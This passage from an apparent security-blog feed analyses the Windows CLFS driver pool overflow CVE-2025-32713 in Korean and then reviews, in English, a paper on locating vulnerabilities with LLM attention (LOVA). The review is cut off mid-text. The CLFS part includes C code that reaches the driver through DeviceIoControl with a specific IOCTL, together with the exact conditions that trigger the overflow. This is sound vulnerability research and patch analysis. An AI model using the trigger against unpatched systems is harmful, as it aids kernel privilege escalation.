&#xAC19;&#xC774; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>[1] &#xB85C;&#xADF8; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xAC00; &#xC788;&#xB294; &#xBCFC;&#xB968;&#xC758; &#xB17C;&#xB9AC; &#xC139;&#xD130; &#xD06C;&#xAE30;(ContainerRawSectorSize)&#xB97C; Length &#xBCC0;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. [2] <code>CcCopyRead</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; Length &#xBCC0;&#xC218; &#xAC12;(&#xC139;&#xD130; &#xD06C;&#xAE30;)&#xB9CC;&#xD07C; &#xB370;&#xC774;&#xD130;&#xB97C; Buffer&#xC5D0; write &#xD558;&#xB294;&#xB370; &#xC774;&#xB54C;, Length(&#xC139;&#xD130; &#xD06C;&#xAE30;)&#xAC00; Buffer&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; Pool Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Pseudo code of CClfsRequest::ReadLogBlock function</span><span class="hljs-comment">// Execution flows not related to output buffer size constraints are omitted.</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsRequest::ReadLogBlock</span><span class="hljs-params">(CClfsRequest *<span class="hljs-keyword">this</span>)</span></span><span class="hljs-function"></span>{  ...  v2 = *(_QWORD *)(*((_QWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">6</span>) + <span class="hljs-number">184</span>i64);  nOutBufferSize = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(v2 + <span class="hljs-number">8</span>);  *((_DWORD *)<span class="hljs-keyword">this</span> + <span class="hljs-number">66</span>) = nOutBufferSize;  <span class="hljs-comment">// **Check OutBufferSize constraints**</span>  <span class="hljs-comment">// **It does not prevent pool overflow when sector size is larger than 512 bytes**</span>  <span class="hljs-keyword">if</span> ( **(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)nOutBufferSize &gt;= <span class="hljs-number">0x28</span>**    &amp;&amp; **(((_DWORD)nOutBufferSize + <span class="hljs-number">0x1D7</span>) &amp; <span class="hljs-number">0xFFFFFE00</span>) != <span class="hljs-number">0</span>**    &amp;&amp; **((nOutBufferSize + <span class="hljs-number">0x1D7</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFE00</span>ui64) == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)nOutBufferSize - <span class="hljs-number">0x28</span>i64**    &amp;&amp; *(_DWORD *)(v2 + <span class="hljs-number">16</span>) &gt;= <span class="hljs-number">8u</span> )  {    <span class="hljs-comment">// Calling CClfsLogXXXX<span class="hljs-doctag">XXX:</span>:ReadLogBlock</span>    ...  }  ...}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC139;&#xD130; &#xD06C;&#xAE30;(ContainerRawSectorSize)&#xAC00; 512byte &#xBCF4;&#xB2E4; &#xCEE4;&#xC57C; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, &#xADF8; &#xC774;&#xC720;&#xB294; <code>ClfsRequest::ReadLogBlock</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCD5C;&#xC18C; &#xCD9C;&#xB825; &#xBC84;&#xD37C;(Buffer) &#xD06C;&#xAE30;&#xAC00; 552byte&#xB85C; &#xC81C;&#xC57D;&#xC774; &#xAC78;&#xB824;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="Direct-call-to-CLFS-sys-using-DeviceIoControl"><a href="#Direct-call-to-CLFS-sys-using-DeviceIoControl" class="headerlink" title="Direct call to CLFS.sys using DeviceIoControl"></a><strong>Direct call to CLFS.sys using DeviceIoControl</strong></h3><p>&#xCD94;&#xAC00;&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC; &#xC77D;&#xAE30; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB294; &#xB85C;&#xADF8; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;(&#xD06C;&#xAE30; &#xAC80;&#xC0AC; &#xBC0F; &#xBCF4;&#xD638; &#xC5ED;&#xD560;) &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB54C;, <code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218;&#xB97C; IOCTL&#xB85C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xB124; &#xBC88;&#xC9F8; &#xC778;&#xC790;(a4) &#xAC12;&#xC774; ReadLogRecord&#xC758; eContextMode &#xC778;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xACB0;&#xC815;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Implementation taken from &quot;CClfsMarshallingContext::ReadLogRecord&quot; and &quot;NtReadLogRecordInternal&quot; in clfsw32.dll</span><span class="hljs-function">BOOL <span class="hljs-title">ReadLogRecordWithDeviceIoControl</span><span class="hljs-params">(HANDLE hLog, CLFS_LSN targetLsn, CLFS_CONTEXT_MODE eContextMode, PVOID OutBuffer, DWORD OutBufferSize)</span> </span>{PVOID InBuffer = (PVOID)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-keyword">if</span> (!InBuffer) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to allocate InBuffer.\\n&quot;</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);}*(CLFS_LSN*)InBuffer = targetLsn;*(INT*)((CHAR*)InBuffer + <span class="hljs-number">8</span>) = (eContextMode == ClfsContextForward) + <span class="hljs-number">1</span>;<span class="hljs-keyword">return</span> DeviceIoControl(hLog, <span class="hljs-number">0x80076832</span>, InBuffer, <span class="hljs-number">0x10</span>, OutBuffer, OutBufferSize, &amp;OutBufferSize, <span class="hljs-number">0</span>);}</code></pre><p>&#xB530;&#xB77C;&#xC11C; <code>ReadLogRecordWithDeviceIoControl</code> &#xD568;&#xC218;&#xB97C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC720;&#xD6A8;&#xD55C; &#xB85C;&#xADF8; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;(Log Sequence Number) &#xC0AC;&#xC6A9;</li><li>eContextMode &#xAC12;&#xC744; ClfsContextNone&#xC73C;&#xB85C; &#xC124;&#xC815;</li><li>&#xB17C;&#xB9AC; &#xC139;&#xD130; &#xBCF4;&#xB2E4; &#xC791;&#xC740; <code>OutBufferSize</code> &#xC0AC;&#xC6A9;</li></ul><p><img src="/2025/08/13/ogu123/cve-2025%E2%80%9332713/1.png" alt></p><p><img src="/2025/08/13/ogu123/cve-2025%E2%80%9332713/2.png" alt></p><blockquote><p>&#xC774;&#xBBF8;&#xC9C0; &#xCD9C;&#xCC98;: <a href="https://medium.com/s2wblog/analysis-of-windows-common-log-file-system-driver-vulnerability-cve-2025-32713-97422b699d54">https://medium.com/s2wblog/analysis-of-windows-common-log-file-system-driver-vulnerability-cve-2025-32713-97422b699d54</a></p></blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; BLF(Base Log File)&#xC774;&#xB098; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC790;&#xCCB4;&#xB97C; &#xC9C1;&#xC811; &#xC218;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCD5C;&#xADFC; CLFS&#xC5D0; &#xB3C4;&#xC785;&#xB41C; <a href="https://www.securityweek.com/microsoft-tackling-windows-logfile-flaws-with-new-hmac-based-security-mitigation/">HMAC &#xAE30;&#xBC18; &#xAC80;&#xC99D; &#xAE30;&#xB2A5;</a>&#xC73C;&#xB85C;&#xB294; &#xB9C9;&#xC744; &#xC218; &#xC5C6;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Windows 11 Insider Preview Canary Channel (&#xBE4C;&#xB4DC;: 27774.1000.amd64fre.rs_prerelease.250111-1221) &#xD658;&#xACBD;&#xC5D0;&#xC11C; CLFS HMAC &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xD14C;&#xC2A4;&#xD2B8; &#xD55C; &#xACB0;&#xACFC;(clfs.sys 10.0.27774.1000) &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Patch-Analysis"><a href="#Patch-Analysis" class="headerlink" title="Patch Analysis"></a><strong>Patch Analysis</strong></h3><pre><code class="hljs cpp">**<span class="hljs-comment">// Pseudo code of CClfsLogFcbPhysical::ReadLogBlock function**</span>**<span class="hljs-comment">// Execution flows not related to the patch are omitted.**</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsLogFcbPhysical::ReadLogBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        CClfsLogFcbPhysical *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        struct _FILE_OBJECT *a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">union</span> _CLS_LSN *a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> struct _CLFS_READ_BUFFER *a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        struct IClfsRequestAsync *a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">union</span> _CLS_LSN *a9,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a10)</span></span><span class="hljs-function"></span>{  ...  <span class="hljs-keyword">if</span> ( (_BYTE)v50    || a2-&gt;PrivateCacheMap    || (v13 = (**(__int64 (__fastcall ***)(CClfsLogFcbPhysical *, struct _FILE_OBJECT *, CClfsLogFcbPhysical *))<span class="hljs-keyword">this</span>)(                <span class="hljs-keyword">this</span>,                a2,                <span class="hljs-keyword">this</span>),        v42 = v13,        v13 &gt;= <span class="hljs-number">0</span>) )  {    ...    <span class="hljs-keyword">if</span> ( ClfsLsnLess(a3, (<span class="hljs-keyword">const</span> CLFS_LSN *)<span class="hljs-keyword">this</span> + <span class="hljs-number">59</span>) )    {      ...      <span class="hljs-keyword">for</span> ( i = a6; ; v22 = i )      {        ...        **<span class="hljs-comment">// Check if the size of a block to be read is not divisible by the logical sector size of the volume where the container is located**</span>        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Feature_4118818104__private_IsEnabledDeviceUsage() &amp;&amp; **CopyLength % ContainerRawSectorSize** )        {          v13 = <span class="hljs-number">0xC000000D</span>; **<span class="hljs-comment">// STATUS_INVALID_PARAMETER**</span>LABEL_51:          v42 = v13;          <span class="hljs-keyword">goto</span> LABEL_18;    **<span class="hljs-comment">// Release resources and return**</span>        }        ...        <span class="hljs-keyword">if</span> ( (_BYTE)v50 )        {          ...        }        <span class="hljs-keyword">else</span>        {          ...          <span class="hljs-keyword">if</span> ( FileOffset.HighPart &lt; <span class="hljs-number">0</span> || v29 &lt; <span class="hljs-number">0</span> )          {LABEL_65:            v13 = <span class="hljs-number">0xC01A000D</span>; **<span class="hljs-comment">// STATUS_LOG_METADATA_CORRUPT**</span>            <span class="hljs-keyword">goto</span> LABEL_51;          }          ...          **<span class="hljs-comment">// Check if the data to be copied exceeds the remaining space in the Buffer passed to the CcCopyRead function**</span>          <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)Feature_4118818104__private_IsEnabledDeviceUsage() )          {            <span class="hljs-keyword">if</span> ( FileOffset.QuadPart &lt; <span class="hljs-number">0</span> || **v30 - *a10 &lt; CopyLength** ) **<span class="hljs-comment">// v30 - *a10 means the remaning space in the Buffer**</span>              <span class="hljs-keyword">goto</span> LABEL_65; **<span class="hljs-comment">// Release resources and return STATUS_LOG_METADATA_CORRUPT**</span>          }          ...          **<span class="hljs-comment">// Copy data**</span>          <span class="hljs-keyword">if</span> ( CcCopyRead(a2, &amp;FileOffset, CopyLength, <span class="hljs-number">1u</span>, Buffer, &amp;IoStatus) )          {            ...          }  ...LABEL_18:  v14 = v40;  ...  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v13;}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows 6&#xC6D4; &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; <code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218; &#xB0B4;&#xBD80; overflow&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC744; &#xCD94;&#xAC00;&#xD574; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC77D;&#xC73C;&#xB824;&#xB294; &#xBE14;&#xB85D; &#xD06C;&#xAE30;(<code>CopyLength</code>)&#xAC00; &#xBCFC;&#xB968;&#xC758; &#xB17C;&#xB9AC; &#xC139;&#xD130; &#xD06C;&#xAE30;(ContainerRawSectorSize)&#xB85C; &#xB098;&#xB204;&#xC5B4;&#xB5A8;&#xC5B4;&#xC9C0;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;</li><li><code>CcCopyRead</code> &#xD568;&#xC218; &#xC2E4;&#xD589; &#xC804;, &#xB0A8;&#xC544; &#xC788;&#xB294; &#xBC84;&#xD37C; &#xACF5;&#xAC04;( <code>v30 - *a10</code> )&#xC774; &#xBCF5;&#xC0AC;&#xD560; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;(<code>CopyLength</code>)&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.securityweek.com/microsoft-tackling-windows-logfile-flaws-with-new-hmac-based-security-mitigation/">https://www.securityweek.com/microsoft-tackling-windows-logfile-flaws-with-new-hmac-based-security-mitigation/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLFS/">CLFS</category>
      
      <category domain="https://hackyboiz.github.io/tags/pool-overflow/">pool overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/13/ogu123/cve-2025%E2%80%9332713/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 3. “Attention Is All You Need for LLM-based Code Vulnerability Localization” Review (EN)</title>
      <link>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/en/</guid>
      <pubDate>Mon, 11 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h1&gt;&lt;p&gt;It&amp;#x2019;s been a w</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>It&#x2019;s been a while since my last post, but I&#x2019;m back! I originally told my team, &#x201C;I&#x2019;m going to analyze all of the Usenix papers using LLM and analyze the trends!&#x201D; But&#x2026; well&#x2026; that was wishful thinking, wasn&#x2019;t it? As expected, real life is not going so easy.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/1.jpg" alt="index_img"></p><blockquote><p>When will slaves be able to be happy?</p></blockquote><p>So, I brought another paper this time. If you thought, &#x201C;Oh, this is something anyone would think of&#x201D; about the previous paper, this paper immediately made me think, &#x201C;Oh, this one is a little different.&#x201D; While other papers focused on the inference output of LLM through prompting, RAG, etc., this paper stood out in that it utilized the structure of LLM itself.</p><p>It is &#x201C;<a href="https://arxiv.org/html/2410.15288v1">Attention Is All You Need for LLM-based Code Vulnerability Localization,</a>&#x201D; which was published on Arxiv in October 2024. It seems that it was not submitted to any academic conference but only uploaded to the archive. The idea itself is good, but I think the conclusion part is a little disappointing.</p><h1 id="2-Paper-Review"><a href="#2-Paper-Review" class="headerlink" title="2. Paper Review"></a>2. Paper Review</h1><p>As the title &#x201C;Attention Is All You Need for LLM-based Code Vulnerability Localization&#x201D; suggests, this paper focuses on how the self-attention mechanism of LLM can be used to identify vulnerability locations. It is also an interesting point that the paper pays homage to &#x201C;Attention Is All You Need,&#x201D; which serves as the foundation for current LLMs. &#x1F604;</p><h2 id="2-1-Limitations-of-Existing-Methods"><a href="#2-1-Limitations-of-Existing-Methods" class="headerlink" title="2.1 Limitations of Existing Methods"></a>2.1 Limitations of Existing Methods</h2><h3 id="1-Lost-in-the-Middle"><a href="#1-Lost-in-the-Middle" class="headerlink" title="1) Lost in the Middle"></a>1) Lost in the Middle</h3><p>Before delving into the details, the paper points out that the biggest limitation of LLM in vulnerability detection is the &#x201C;decrease in inference accuracy in long contexts.&#x201D; It is said that when the code exceeds 300 lines, the accuracy drops below 5%.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/2.png" alt="index_img"></p><p>The papers cited as evidence are as follows.</p><ul><li><a href="https://arxiv.org/pdf/2307.03172">Lost in the Middle: How Language Models Use Long Contexs</a></li><li><a href="https://arxiv.org/pdf/2406.10149">BABILong: Testing the Limits of LLMs with Long Context Reasoning-in-a-Haystack</a></li></ul><p>However, you probably don&#x2019;t want to read all these papers while reading this article, right? There is a YouTube channel that covers a similar topic, so you may want to check it out.</p><ul><li><a href="https://www.youtube.com/watch?v=EbN_DWM3DJc">OpenAI, Google, Claude are all the same&#x2026; Performance drops much more than expected as input length increases - How to respond | Context Engineering</a></li></ul><p>I haven&#x2019;t read the above content in detail, but it seems to be an issue where, as the number of tokens unrelated to the core content increases, the model fails to accurately focus on the content that requires attention. This is a problem that anyone who has used LLM services extensively, especially those who have tested them with long code snippets for vulnerability detection, has likely encountered at least once. When asking to identify vulnerabilities across multiple functions, issues such as forgetting or failing to recall the code may arise. However, I have noticed that these issues have improved significantly since late last year to early this year. Additionally, papers addressing these issues are beginning to emerge.</p><p>(This information was found by LLM. lol)</p><ol><li>Training method for finding information regardless of location</li></ol><ul><li>&#x201C;Never Lost in the Middle: Mastering Long-Context Question Answering with Position-Agnostic Decompositional Training&#x201D; (2024)<ul><li>Key points: To address this issue, we propose a new training method called &#x201C;Position-Agnostic Decompositional Training.&#x201D; Long questions are decomposed into multiple short questions, and the positions of the correct answers are intentionally mixed to train the model.</li><li>Solution: This reduces the model&#x2019;s reliance on the &#x2018;location&#x2019; of information and enhances its ability to find the necessary information regardless of context.</li></ul></li></ul><ol><li>Changing the structure of input data</li></ol><ul><li>&#x201C;Structured Packing in LLM Training Improves Long Context Utilization&#x201D; (2023)<ul><li>Key points: Instead of simply concatenating multiple documents in order for training, this method proposes providing the model with information that is structurally grouped (packing) together.</li><li>Solution: Strengthens the logical connectivity of information to help the model better understand and utilize information in the middle of the context.</li></ul></li></ul><ol><li>Improving the attention mechanism</li></ol><ul><li>&#x201C;Mixture-of-Recursions: Learning Dynamic Recursive Depths for Adaptive Token-Level Computation&#x201D; (2025)<ul><li>Key Points: Instead of treating all tokens equally, we propose the MoR (Mixture-of-Recursions) architecture, which identifies important tokens through a &#x201C;router&#x201D; and dynamically allocates more computations to those tokens.</li><li>Solution: By focusing computational resources on importance rather than location, we ensure that even core information in the middle of the context is processed deeply without being overlooked.</li></ul></li></ul><ol><li>Combination and Comparison with Retrieval-Augmented Generation (RAG)</li></ol><ul><li>&#x201C;Long Context vs. RAG for LLMs: An Evaluation and Revisits&#x201D; (2025)<ul><li>Key Points: This paper compares and analyzes the &#x201C;Long Context&#x201D; approach, which inputs the entire long context, and the RAG (Retrieval-Augmented Generation) approach, which retrieves only the necessary information from an external database.</li><li>Solution: RAG demonstrates that it can be an effective alternative to avoid the &#x201C;Lost in the Middle&#x201D; problem by initially &#x201C;searching&#x201D; for only the necessary information and presenting it at the beginning of the context. However, the analysis concludes that which method is superior depends on the type of task.</li></ul></li></ul><p>Looking at the above papers, we can see that research is being conducted to solve this problem in various aspects, such as training processes, training datasets, attention mechanisms, and context.</p><h3 id="2-Accuracy"><a href="#2-Accuracy" class="headerlink" title="2) Accuracy"></a>2) Accuracy</h3><p>The fundamental problem with LLM is the accuracy of the output results. Of course, it has improved significantly since ChatGPT 3.5 was first released, but false positives and false negatives still exist. To address this, the following advanced reasoning techniques have been employed:</p><ul><li><a href="https://arxiv.org/pdf/2203.11171">SELF-CONSISTENCY IMPROVES CHAIN OF THOUGHT REASONING IN LANGUAGE MODELS</a></li><li><a href="https://arxiv.org/pdf/2408.06195">MUTUAL REASONING MAKES SMALLER LLMS STRONGER PROBLEM-SOLVERS</a></li></ul><p>However, even these advanced prompting and CoT techniques rely on stochastic decoding to utilize multiple outputs for majority voting or scoring, which are considered incomplete methods.</p><ul><li>Stochastic decoding is one of the ways LLMs generate text, where tokens are randomly sampled from a calculated probability distribution. In other words, it does not always select the token with the highest probability but gives each token a chance to be selected proportional to its probability.</li><li>Conversely, deterministic decoding simply selects the token with the highest probability, ensuring the same output for the same input every time, but it can generate repetitive and less creative results.</li></ul><p>&#x201C;Due to this randomness, improvements in accuracy are minimal, and it is difficult to pinpoint the exact location of vulnerabilities!&#x201D; This is the second issue raised in this paper.</p><h2 id="2-2-Hypotheses-and-Experiments"><a href="#2-2-Hypotheses-and-Experiments" class="headerlink" title="2.2 Hypotheses and Experiments"></a>2.2 Hypotheses and Experiments</h2><h3 id="1-Hypotheses"><a href="#1-Hypotheses" class="headerlink" title="1) Hypotheses"></a>1) Hypotheses</h3><ol><li><p>When searching for vulnerable code, attention is focused on specific lines.</p></li><li><p>If instructed to search for vulnerabilities on specific lines, attention becomes stronger, potentially improving accuracy.</p></li><li><p>Lines containing vulnerabilities will influence the model&#x2019;s output.</p></li><li><p>Highlighting lines without vulnerabilities will not affect the results.</p></li></ol><h3 id="2-Experiment"><a href="#2-Experiment" class="headerlink" title="2) Experiment"></a>2) Experiment</h3><p>The paper first tests whether self-attention can be used to identify the location of vulnerabilities.</p><pre><code class="hljs yaml"><span class="hljs-attr">Code:</span>    <span class="hljs-string">....</span> <span class="hljs-attr">8:</span>     <span class="hljs-string">glyphs</span> <span class="hljs-string">=</span> <span class="hljs-string">(cairo_glyph_t</span> <span class="hljs-string">*)</span> <span class="hljs-string">gmalloc</span> <span class="hljs-string">(len</span>    <span class="hljs-string">*</span> <span class="hljs-string">sizeof</span> <span class="hljs-string">(cairo_glyph_t));</span> <span class="hljs-attr">9:</span>     <span class="hljs-string">glyphCount</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span><span class="hljs-attr">10:</span> <span class="hljs-string">}</span><span class="hljs-string">Pay</span> <span class="hljs-string">attention</span> <span class="hljs-string">to</span> <span class="hljs-string">line</span> {<span class="hljs-number">8</span>}<span class="hljs-string">.</span> <span class="hljs-string">Check</span> <span class="hljs-string">whether</span> <span class="hljs-string">there</span> <span class="hljs-string">are</span> <span class="hljs-string">vulnerabilities</span> <span class="hljs-string">in</span> <span class="hljs-string">it.</span><span class="hljs-attr">vulnerable line:</span> <span class="hljs-string">```</span></code></pre><p>To find vulnerabilities, write a prompt as shown above. When predicting words after ```, the code with vulnerabilities will receive the highest attention, right? Not only that, but it also tells you which line it is, maximizing the change in weight and allowing you to observe the change.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/3.png" alt="index_img"></p><p>When testing with actual code without vulnerabilities and code with artificially inserted vulnerabilities based on the former,</p><ol><li>Upon checking the attention of code with and without vulnerabilities, it was found that, except for the 70th line where the vulnerability exists, the weights of other lines were high, indicating that the vulnerability was not properly identified.</li><li>When highlighting the 70th line to check the attention in both the code without vulnerabilities and the code with vulnerabilities, the weight of the 70th line increased slightly, and in the code with actual vulnerabilities, the weight was even higher.</li></ol><p>As shown above, this simple test demonstrates that vulnerabilities can be identified to some extent.</p><h1 id="3-LOVA-LO-cating-Vulnerabilities-via-Attention"><a href="#3-LOVA-LO-cating-Vulnerabilities-via-Attention" class="headerlink" title="3. LOVA(LO-cating Vulnerabilities via Attention)"></a>3. LOVA(LO-cating Vulnerabilities via Attention)</h1><p><img src="/2025/08/11/j0ker/llm_part3/en/4.png" alt="index_img"></p><p>The LOVA proposed in this paper compares the weights of unhighlighted code and highlighted code based on the results of the experiments described above to ultimately identify the code lines with the highest probability of containing vulnerabilities.</p><p>It is divided into three stages: Code Line Highlight, Attention Calculation, and Vulnerability Line Localization. Let&#x2019;s take a closer look at each one!</p><h2 id="3-1-Code-Line-Highlight"><a href="#3-1-Code-Line-Highlight" class="headerlink" title="3.1 Code Line Highlight"></a>3.1 Code Line Highlight</h2><p>LOVA creates two versions of prompts. One is the original code with no modifications (Base prompt), and the other is a version where each line of code is highlighted one by one (Highlighted prompts). If the code has 100 lines, one original prompt and 100 highlighted prompts are generated.</p><p>However, there is one problem here. Simply adding a comment like &#x201C;// Take a look here!&#x201D; or inserting specific keywords causes the LLM to ignore the code when it becomes long, or even causes hallucinations, mistaking normal code for vulnerable code.</p><p>Therefore, in LOVA, we directly specify the <strong>code line index</strong>. We add numbers to the front of the code and explicitly state in the prompt, &#x201C;Focus on line 8 and check for vulnerabilities!&#x201D;</p><h2 id="3-2-Attention-Calculation"><a href="#3-2-Attention-Calculation" class="headerlink" title="3.2 Attention Calculation"></a>3.2 Attention Calculation</h2><p>Next, we need to quantitatively calculate how the LLM&#x2019;s &#x2018;attention&#x2019; changes when each line is highlighted. The attention data output by the LLM is an enormous tensor in the form of (num_tokens, num_tokens, num_layers, num_heads).  The paper mentions that even a 1,000-token code can generate hundreds of millions of data points&#x2026; So, analyzing it myself might be faster, right?</p><p>LOVA performs dimensionality reduction as follows to retain only the information necessary for vulnerability analysis from this massive dataset.</p><p><img src="/2025/08/11/j0ker/llm_part3/en/5.png" alt="index_img"></p><blockquote><p>Pseudocode for Steps 1 to 4</p></blockquote><ol><li>Summarize the attention of all heads into a single attention map in the form of (num_tokens, num_tokens, num_layers) and merge them.</li><li>Maintain the attention of each layer as they have their own unique meanings.</li><li>Use the last token as a query (Q) to determine how much attention it receives from all previous tokens, and create a matrix of size (num_tokens, num_layers).</li><li>Sum the attention values of all tokens in each line to calculate the total attention value for that line, and create a matrix of size (num_lines, num_layers). This matrix is called LayerwiseAttnMat.</li><li><p>Calculate the difference between the LayerwiseAttnMat of the highlighted prompt and the base prompt to create DiffAttnMat. Instead of looking at the differences across all lines, we extract only the data from the &#x2018;instruction&#x2019; and &#x2018;highlighted line&#x2019; where the actual changes are expected to be the largest, and create the final <code>VulnAttnMat</code>.</p><p> <img src="/2025/08/11/j0ker/llm_part3/en/6.png" alt="image.png"></p></li></ol><h2 id="3-3-Vulnerability-Line-Localization"><a href="#3-3-Vulnerability-Line-Localization" class="headerlink" title="3.3 Vulnerability Line Localization"></a><strong>3.3 Vulnerability Line Localization</strong></h2><p>The final step is to select the lines with actual vulnerabilities based on the patterns in <code>VulnAttnMat</code>. While it is possible to rank them simply by the sum of attention changes, it is difficult to apply consistent criteria across languages because the vulnerability patterns in C and Python are different.  Furthermore, this is just a &#x201C;suspicious ranking,&#x201D; not an accurate judgment such as &#x201C;this line has an 80% probability of being vulnerable!&#x201D; Therefore, LOVA uses a deep learning model called <strong>Bi-LSTM</strong> at this stage. (Ugh&#x2026; it&#x2019;s getting more and more complicated&#x2026;)</p><ol><li>First, we create a long vector from the <code>VulnAttnMat</code> calculated for each line.</li><li>We feed this vector sequence into the Bi-LSTM model as input. The reason we use Bi-LSTM is that when determining whether a specific line (A) is suspicious, it is more 